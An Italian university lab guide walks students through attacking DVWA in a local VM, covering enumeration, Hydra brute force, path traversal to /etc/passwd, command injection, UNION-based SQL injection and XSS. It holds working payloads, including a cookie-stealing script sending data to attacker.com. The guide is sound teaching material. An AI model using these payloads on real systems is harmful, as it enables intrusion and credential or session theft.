# Guida Lab — Modulo S3: Web Security (DVWA)
**Corso**: Lab Sicurezza Informatica T
**Materiale**: `Web_security_6_marzo.pdf` (teoria, 45pp) + `LAB_web_security_11_marzo.pdf` (lab, 42pp)
**VM**: `LabSicurezzaInformatica` in VirtualBox — Parrot OS
**Prerequisiti**: S1 ✅ (nmap, ip a, gobuster), S2 ✅ (sessioni, cookie, autenticazione)

---

## Setup

> ⚠️ **Snapshot obbligatorio** prima di iniziare ogni sezione di sfruttamento.

1. Avvia la VM Parrot in VirtualBox.

2. Verifica che nessun altro processo occupi la porta 80:
```bash
sudo ss -tulpn
```
Se appare nginx in ascolto sulla 80, fermalo:
```bash
sudo service nginx stop
```

3. Avvia DVWA (primo avvio: scarica l'immagine Docker, alcuni minuti):
```bash
cd ~/pentestlab
./pentestlab.sh start dvwa
```
Se `pentestlab` non è presente:
```bash
git clone https://github.com/eystsen/pentestlab.git && cd pentestlab
./pentestlab.sh start dvwa
```

4. **Prima configurazione DVWA** (solo al primissimo avvio):
   - Apri `http://dvwa` nel browser di Parrot
   - Login: `admin` / `password`
   - Vai su **Setup** → **Create / Reset Database**
   - Vai su **DVWA Security** → seleziona `low` → **Submit**

5. Verifica il tuo IP host (ti servirà per RFI e Hydra):
```bash
ip a
```
⚠️ Gli IP nel PDF (.32/.33/.34/.5) sono esempi dell'anno scorso. Il tuo IP è quello della tua interfaccia host-only.

---

## Threat Model

**Prospettiva attaccante**: l'applicazione web non distingue tra *dato* e *istruzione*. Qualsiasi input controllato dall'attaccante che raggiunge un interprete — SQL, shell, JavaScript, XML parser — è potenzialmente armabile. Il lab segue le fasi di un pentest reale su web app: enumerazione servizi → directory discovery → brute force credenziali → sfruttamento vulnerabilità applicative (LFI, command injection, SQLi, XSS).

**Prospettiva difensore**: *validate input* (filtra e valida prima di usarlo), *escape output* (codifica HTML prima di echeggiarlo), usa *bind variables* per SQL (prepared statements), principio del minimo privilegio (www-data non dovrebbe leggere /etc/passwd), configura *HTTP security headers* (CSP, X-Frame-Options, HSTS).

---

## Esercizi

> Lorenzo digita tutti i comandi. La guida li fornisce, non li esegue.

---

### Esercizio 1 — Service Enumeration

**Obiettivo**: scoprire l'indirizzo IP del container DVWA e le porte aperte sulla rete host-only.

**Concetto**: prima di attaccare bisogna sapere chi risponde dove. Su rete host-only si scansiona il subnet per trovare i nodi attivi, poi si verificano le porte aperte sul target.

**Comandi**:
```bash
# Trova il tuo IP host (prendi nota del subnet, es. 192.168.56.0/24)
ip a

# Scopri gli host attivi sulla rete (sostituisci con il tuo subnet)
sudo nmap -sn 192.168.XX.0/24

# Scansione porte TCP sul container DVWA trovato
nmap -sT -p- IP_DVWA

# Identificazione servizi sulle porte aperte
nmap -sV -p 80,8080 IP_DVWA
```

**Anatomia dei comandi**:
- `ip a` — mostra tutte le interfacce con i loro indirizzi IP. Serve per conoscere il proprio IP e subnet prima di qualsiasi scansione.
- `sudo nmap -sn <subnet>` — *ping scan*: invia ARP request (su rete locale) per scoprire quali host sono vivi senza scansionare porte. Richiede `sudo` per usare ARP; senza sudo usa ICMP, meno affidabile su rete locale.
- `nmap -sT -p- IP` — TCP connect scan su tutte le 65535 porte (`-p-`). `-sT` completa la handshake TCP; non è stealth ma non richiede sudo. Ti dice *quali porte sono aperte*, non cosa gira.
- `nmap -sV -p 80,8080 IP` — service/version detection: legge i banner dei servizi per identificare nome e versione. `-sV` fa "parlare" il servizio. Senza `-sV` sai solo che la porta è aperta.

⚠️ **Errore frequente**: `-sT` vs `-sV` hanno funzioni diverse. `-sT` = stato porta (open/closed); `-sV` = servizio e versione. Per sapere "cosa gira sulla 80" serve `-sV`.

**Output atteso**:
```
Host: 192.168.56.X  Status: Up
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.x
```

**Cosa verificare**: porta 80 aperta sul container; `http://IP_DVWA` nel browser mostra la login di DVWA.

---

### Esercizio 2 — Directory Discovering (gobuster)

**Obiettivo**: trovare directory e file nascosti nell'applicazione web — path non linkati che possono esporre funzionalità admin, backup, configurazioni.

**Concetto**: security misconfiguration (A5) spesso lascia path accessibili che non compaiono nella navigazione normale. Un web content scanner li forza con una wordlist — ogni entry viene provata come path HTTP.

**Comandi**:
```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://dvwa
```

**Anatomia del comando**:
- `gobuster dir` — modalità directory/file brute-force (vs `dns` per sottodomini, `vhost` per virtual host).
- `-w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt` — wordlist da provare come path. Su Parrot le SecLists stanno in `/usr/share/wordlists/`. `big.txt` è ampia e bilanciata per web content discovery.
- `-u http://dvwa` — URL target. `dvwa` si risolve perché Docker configura l'hostname. Alternativa: `-u http://IP_DVWA` se la risoluzione non funziona.
- Variante più veloce: `-t 50` aumenta i thread (default 10).

**Output atteso**:
```
/.htpasswd            (Status: 403)
/.svn                 (Status: 301)
/cgi-bin/             (Status: 403)
/config               (Status: 301)
/favicon.ico          (Status: 200)
/phpmyadmin           (Status: 301)
/robots.txt           (Status: 200)
```

**Cosa verificare**: `/phpmyadmin` è esposto (A5 Security Misconfiguration — interfaccia admin del DB accessibile). `/config` può contenere file di configurazione con credenziali. `/robots.txt` può rivelare path che l'admin voleva nascondere.

---

### Esercizio 3 — Brute Force Login (Burp + Hydra)

**Obiettivo**: craccare le credenziali del form "Brute Force" di DVWA usando Burp per analizzare la request e Hydra per automatizzare l'attacco.

**Concetto**: il brute force su un form HTTP GET richiede di conoscere esattamente la struttura della request — parametri, cookie di sessione, stringa di fallimento. Burp intercetta la request per estrarre queste informazioni; Hydra le usa per iterare su username/password.

**Comandi**:

Step 1 — Intercetta la request con Burp:
```
# Avvia Burp Community Edition dal menu applicazioni
# Usa le default settings + "Temporary project"
# In Burp: Proxy → Intercept is ON
# Configura Firefox/Chromium per usare il proxy 127.0.0.1:8080
# Vai su http://dvwa/vulnerabilities/brute/ e digita "prova"/"prova" → Login
# Burp mostra la request intercettata:
# GET /vulnerabilities/brute/?username=prova&password=prova&Login=Login HTTP/1.1
# Cookie: security=low; PHPSESSID=<tuo_session_id>
# Nota il tuo PHPSESSID — ti serve per il comando Hydra
```

Step 2 — Lancia Hydra con i dati catturati:
```bash
hydra IP_CONTAINER_DVWA \
  -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100.txt \
  http-get-form \
  "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=<tuo_session_id>"
```

Step 3 (bonus) — Genera wordlist contestuale da sito con cewl:
```bash
cewl -d 1 -m 5 https://ulisse.unibo.it
```

**Anatomia dei comandi**:
- `hydra <IP>` — target dell'attacco. Hydra prova ogni combinazione username/password contro il servizio specificato.
- `-L <file>` — lista di username da provare. `-l admin` per un singolo username noto.
- `-P <file>` — lista di password da provare. `-p password` per una singola password.
- `http-get-form` — modulo per form HTTP GET. Per POST: `http-post-form`.
- La stringa finale ha formato `"path:parametri:stringa_errore:header"`:
  - `^USER^` e `^PASS^` = placeholder sostituiti da Hydra per ogni tentativo
  - La stringa dopo il terzo `:` è il testo che appare quando il login **fallisce** — Hydra deduce il successo dalla sua assenza
  - `H=Cookie:...` = header custom necessario perché DVWA verifica il PHPSESSID; se scade il cookie, Hydra non funziona
- `cewl -d 1 -m 5 <url>` — crawla il sito a profondità 1 estraendo parole di almeno 5 caratteri. Genera una wordlist contestuale: parole che l'amministratore del sito potrebbe usare come password.

⚠️ **Il PHPSESSID nel comando Hydra è il TUO cookie di sessione attivo**, non quello del PDF. Copialo da Burp ogni volta che lanci Hydra.

**Output atteso**:
```
[DATA] attacking http-get-form://192.168.56.X:80/vulnerabilities/brute/...
[80][http-get-form] host: 192.168.56.X   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
```

**Cosa verificare**: Hydra trova `admin`/`password`. Il form non ha rate limiting né lockout → A7 (Identification and Authentication Failures) confermato.

---

### Esercizio 4 — File Inclusion (LFI / Path Traversal)

**Obiettivo**: usare la vulnerabilità di File Inclusion per leggere file arbitrari del server tramite path traversal, poi simulare RFI.

**Concetto**: la pagina DVWA "File Inclusion" accetta un parametro `page=` passato direttamente a `include()` PHP senza filtri sull'input. LFI (Local File Inclusion) legge file locali del server; path traversal con `../` scala le directory fino alla radice. RFI (Remote File Inclusion) carica ed *esegue* file remoti — RCE via inclusion.

**Comandi**:

LFI — leggi `/etc/passwd` via path traversal:
```
# Nel browser, DVWA → File Inclusion
# Modifica il parametro page= nella URL:
http://dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
```

RFI — includi file PHP remoto (richiede abilitazione manuale):
```bash
# Step 1: crea un file PHP di test su Parrot
echo '<?php echo "<p>Hello World</p>"; ?>' > test.php

# Step 2: servi il file con un web server HTTP sulla porta 8081
python3 -m http.server 8081

# Step 3: nel browser di DVWA (in un altro terminale)
# http://dvwa/vulnerabilities/fi/?page=http://IP_PARROT:8081/test.php
```

**Anatomia dei comandi**:
- `../../../../etc/passwd` — ogni `../` risale di un livello dalla webroot di DVWA. Quattro livelli portano alla radice `/`, poi si accede a `/etc/passwd`. Il numero di `../` varia secondo la profondità della webroot; si prova incrementalmente finché non funziona.
- `python3 -m http.server 8081` — avvia un web server HTTP minimale sulla porta 8081 nella directory corrente. Permette al server DVWA di raggiungere `test.php` via GET. Il modulo `http.server` è built-in Python — nessuna installazione.
- `echo '<?php ... ?>' > test.php` — crea un file PHP minimale come proof-of-concept. Se DVWA mostra "Hello World", ha scaricato e *eseguito* il PHP remoto (RFI con esecuzione). Se mostra il sorgente PHP, l'esecuzione remota è disabilitata.

⚠️ **RFI è disabilitato di default su DVWA** (`allow_url_include = Off` in PHP). Il lab mostra il vettore teorico. In un sistema reale con PHP mal configurato, l'RFI permetterebbe RCE completo.

**Output atteso** (LFI):
```
# La pagina mostra il contenuto di /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
dvwa:x:1000:1000:dvwa,,,:/home/dvwa:/bin/bash
```

**Cosa verificare**: il contenuto di `/etc/passwd` appare nella pagina DVWA — hai letto un file di sistema tramite il solo parametro URL. A1 (Broken Access Control / File Disclosure) confermato.

---

### Esercizio 5 — Command Injection

**Obiettivo**: eseguire comandi di sistema arbitrari sul server abusando del form "ping" di DVWA.

**Concetto**: il codice PHP usa `exec()` per eseguire il comando ping concatenando direttamente l'input utente, senza filtrare i separatori bash. `;` esegue il secondo comando sempre (indipendentemente dall'exit code del primo); `&&` solo se il primo ha exit code 0. L'impatto è RCE con i privilegi del webserver (www-data).

**Comandi**:
```bash
# DVWA → Command Execution (Command Injection)
# Inserire nel campo dell'indirizzo IP:

127.0.0.1; ls
# → ; esegue ls sempre, anche se ping fallisse

127.0.0.1 && ls
# → && esegue ls solo se ping 127.0.0.1 ha exit code 0

; cat /etc/passwd
# → senza IP iniziale: ping fallisce subito, poi cat legge utenti di sistema

; id
# → mostra l'utente con cui gira il webserver

; uname -a
# → informazioni sul kernel della macchina
```

**Anatomia dei payload**:
- `127.0.0.1; ls` — il PHP costruisce il comando `ping -c 4 127.0.0.1; ls`. Il `;` è un separatore bash: esegue i due comandi in sequenza, indipendentemente dall'exit code del primo. Funziona sempre.
- `127.0.0.1 && ls` — `&&` è condizionale: esegue `ls` solo se `ping` termina con successo (exit code 0). Se l'IP non risponde, `ls` non gira. Meno affidabile di `;` per l'attaccante.
- `; cat /etc/passwd` — senza IP: il ping fallisce immediatamente, poi `cat` legge il file. Payload più diretto.
- `; id` — rivela UID/GID del processo webserver. Ti dice se www-data ha privilege escalation possibile (es. appartenenza a gruppi insoliti).

⚠️ **Livello medium DVWA** filtra `;` ma non `&&` → usare `&& ls` su difficoltà medium. Su low funzionano entrambi.

**Output atteso**:
```
# Dopo "127.0.0.1; ls":
PING 127.0.0.1 (127.0.0.1) ...
dvwa  hackable  index.php  ...

# Dopo "; id":
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Cosa verificare**: vedi l'output di comandi arbitrari nella pagina web — RCE confermato. Il processo gira come `www-data` (non root), ma dalla webroot potresti leggere file di config con credenziali del DB.

---

### Esercizio 6 — SQL Injection Semplice

**Obiettivo**: alterare la logica della query SQL per ottenere tutti i record della tabella utenti invece di uno solo.

**Concetto**: il parametro `id` viene concatenato direttamente nella query PHP senza sanitizzazione:  
`$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'"`.  
Un apostrofo nel payload rompe la stringa SQL; la condizione `OR 'a'='a` rende il WHERE always-true → tutti i record.

**Comandi**:
```
# DVWA → SQL Injection, campo User ID

' OR 'a'='a
```

**Anatomia del payload**:
- `'` — chiude la stringa aperta dal codice PHP (`WHERE user_id = '`). Senza questo, il DB riceverebbe l'input come valore letterale.
- `OR 'a'='a` — aggiunge una condizione always-true. `'a'='a'` è sempre vero in SQL.
- La query risultante: `SELECT First_Name, Last_Name FROM users WHERE ID='' OR 'a'='a';`
- Nessun `#` finale necessario qui perché il payload chiude correttamente la stringa prima del `'` finale del PHP.

**Output atteso**:
```
ID: ' OR 'a'='a
First name: admin
Surname: admin

ID: ' OR 'a'='a
First name: Gordon
Surname: Brown

[... tutti gli utenti del DB ...]
```

**Cosa verificare**: la pagina restituisce tutti gli utenti invece di uno — la logica del WHERE è stata bypassata. Questo funziona anche su form di login: `' OR '1'='1` bypassa l'autenticazione.

---

### Esercizio 7 — SQL Injection Union Based

**Obiettivo**: estrarre credenziali dal database usando la tecnica UNION per aggiungere una seconda query alla query originale.

**Concetto**: `UNION SQL` concatena i risultati di due SELECT a patto che abbiano lo stesso numero di colonne. La catena è in 4 passi: (1) scopri il numero di colonne con NULL progressivi → (2) estrai metadati (versione, hostname, DB corrente) → (3) naviga `information_schema` per mappare la struttura → (4) estrai le credenziali reali. `#` commenta il `'` finale che il codice PHP aggiunge dopo il parametro.

**Comandi**:

Step 1 — Scopri il numero di colonne:
```sql
' union select NULL #
```
→ errore "The used SELECT statements have a different number of columns"
```sql
' union select NULL,NULL #
```
→ nessun errore: **2 colonne**!

Step 2 — Estrai metadati del server:
```sql
' union select NULL,@@version #
' union select NULL,@@hostname #
' union select NULL,database() #
```

Step 3 — Enumera la struttura del database:
```sql
' union select null,schema_name from information_schema.schemata #
```
→ mostra tutti i DB: `information_schema`, `cdcol`, `dvwa`, `mysql`, `phpmyadmin`, `test`

```sql
' union select null,table_name from information_schema.tables where table_schema='dvwa' #
```
→ tabelle in dvwa: `guestbook`, `users`

```sql
' union select null,column_name from information_schema.columns where table_name='users' #
```
→ colonne di users: `user_id`, `first_name`, `last_name`, `user`, `password`, `avatar`

Step 4 — Estrai le credenziali:
```sql
' union select user,password from users #
```

**Anatomia dei payload**:
- `' union select NULL,NULL #` — l'apostrofo iniziale chiude la stringa del parametro. `UNION` appaia una seconda SELECT. I `NULL` sono placeholder neutrali compatibili con qualsiasi tipo di colonna. `#` commenta tutto ciò che segue nella query originale, incluso il `'` di chiusura del PHP.
- `@@version` / `@@hostname` — variabili di sistema MySQL: restituiscono versione del server e hostname della macchina. `database()` = nome del DB attualmente selezionato.
- `information_schema` — database di sistema MySQL/MariaDB che contiene la mappa completa di tutti gli altri DB: `.schemata` lista i database, `.tables` lista le tabelle, `.columns` lista le colonne. È la "mappa del tesoro" per chi fa SQLi.
- `where table_schema='dvwa'` — filtra le tabelle per restare nel DB target e non ricevere migliaia di righe da tutti i DB di sistema.
- `' union select user,password from users #` — usa i nomi di colonna trovati allo Step 3. Nota: `user` e `password` sono i nomi trovati, non parole chiave SQL.

⚠️ **information_schema è specifico di MySQL/MariaDB** (presente in DVWA). Per PostgreSQL si usa `pg_catalog`; per SQLite si usa `sqlite_master`. Le query vanno adattate al DBMS trovato con `@@version`.

**Output atteso** (Step 4):
```
ID: ' union select user,password from users #
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```
`5f4dcc3b5aa765d61d8327deb882cf99` = MD5 di "password". Gli hash MD5 senza salt sono craccabili con rainbow table o ricerca online.

**Cosa verificare**: vedi username + hash MD5 di tutti gli utenti DVWA. Cerca `5f4dcc3b5aa765d61d8327deb882cf99` online → "password". Hash senza salt = A2 (Cryptographic Failures).

---

### Esercizio 8 — XSS Reflected

**Obiettivo**: iniettare JavaScript nel form "XSS Reflected" di DVWA e vedere il codice eseguire nel browser.

**Concetto**: il server echeggia l'input nella pagina HTML senza encoding. Il browser interpreta `<script>` come JavaScript ed esegue il codice. In un attacco reale l'attaccante costruisce una URL con il payload nel parametro GET e la invia alla vittima — quando la vittima clicca, il suo browser esegue il codice JS nel contesto del sito fidato (che ha il suo cookie di sessione).

**Comandi**:
```html
<!-- DVWA → XSS (Reflected), campo "What's your name?" -->

<script>alert("XSS")</script>

<script>alert(document.cookie)</script>
```

**Anatomia dei payload**:
- `<script>alert("XSS")</script>` — tag script HTML: il browser lo interpreta come JavaScript. `alert()` è la proof-of-concept classica — se appare il popup, il codice è eseguito. Il server ha echeggiato l'input senza HTML-encoding (`&lt;` per `<`).
- `<script>alert(document.cookie)</script>` — `document.cookie` è una proprietà del DOM che contiene tutti i cookie del dominio corrente, incluso il PHPSESSID. Se appare il cookie nel popup, un attaccante potrebbe esfiltrarla inviandola al suo server invece di chiamare `alert()`.
- In attacco reale la URL sarebbe: `?name=<script>alert(document.cookie)</script>` — la vittima (già loggata su DVWA) viene portata a cliccare questa URL; il suo browser autentico esegue il codice JS nel contesto di DVWA, che ha accesso al suo PHPSESSID.

**Output atteso**: appare un popup con il testo "XSS" (primo payload) o il valore del PHPSESSID (secondo payload).

**Cosa verificare**: il popup appare — XSS confermato. Il sito non fa HTML-encoding dell'input prima di echeggiarlo nella risposta.

---

### Esercizio 9 — XSS Stored

**Obiettivo**: iniettare JavaScript nella sezione "Stored XSS" di DVWA in modo che il payload rimanga nel DB ed esegua automaticamente per ogni visitatore.

**Concetto**: a differenza del Reflected (richiede che la vittima clicchi una URL specifica), lo Stored XSS persiste nel database del server. Ogni utente che carica la pagina esegue il codice malevolo senza alcuna interazione richiesta — è più pericoloso. Il vettore tipico sono forum, campi commento, guestbook.

**Comandi**:
```html
<!-- DVWA → XSS (Stored) -->
<!-- Compila il form guestbook: -->
<!-- Name: test -->
<!-- Message: <script>alert("XSS stored")</script> -->
<!-- Clicca "Sign Guestbook" -->
```

Per mostrare il cookie di sessione a ogni visitatore:
```html
<script>alert(document.cookie)</script>
```

**Anatomia del payload**:
- Lo stesso `<script>alert()</script>` viene inserito nel campo message del guestbook. Il server salva il payload nel DB senza sanitizzarlo. Ogni volta che qualsiasi utente carica la pagina del guestbook, il payload viene echeggiato dall'HTML e il browser lo esegue.
- **Differenza critica con Reflected**: nel Reflected il payload è nell'URL e richiede social engineering per far cliccare la vittima; nello Stored è nel DB e colpisce automaticamente tutti i visitatori successivi — zero interazione.
- In un attacco reale il payload esiltra il cookie su un server dell'attaccante: `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`.

**Output atteso**: il popup appare al submit; **ricaricando la pagina senza fare nulla, il popup riappare** — il payload è permanente nel DB.

**Cosa verificare**: ricarica la pagina → il popup riappare. Questo dimostra la persistenza: chiunque carichi questa pagina esegue il JS.

---

## Connessioni

- **Con S1 (enumerazione)**: `nmap` e `gobuster` di questo lab sono le stesse tecniche di S1 riapplicate a web app. La diferenza: qui la discovery porta a vulnerabilità applicative invece che a mappa di rete.
- **Con S2 (autenticazione)**: il brute force (Es.3) dimostra perché rate limiting e lockout sono fondamentali. XSS con `document.cookie` (Es.8-9) dimostra il furto di sessione — esattamente il rischio che i session token sicuri di S2 cercano di mitigare.
- **Con S5 (firewall)**: Command Injection (Es.5) dà RCE come www-data. Le regole iptables in uscita limitano il blast radius bloccando reverse shell e connessioni verso la rete interna (SSRF).
- **Con S10 (Suricata)**: i payload `' union select`, `; cat /etc/passwd`, `<script>alert` generano pattern rilevabili nel traffico HTTP — Suricata può matchare questi signature nelle request web.

---

## Famiglia d'esame

Tipologia: **Web vulnerabilities** ⭐
Prova passata correlata: `SIMULAZIONI ESAMI/SICINF/<file_web_vulnerabilities>` — eseguila al termine del lab.

---

<!-- AUTO-LINKS -->

<!-- AUTO-LINKS:START -->
## 🔗 Collegati

- [[appunti_moduloS3_web_security]]
- [[lezione_moduloS3_web_security]]

**Hub:** [[master_map_studio]] · [[concept_maps]] · [[metodo_studio_esami_pratici]]
<!-- AUTO-LINKS:END -->
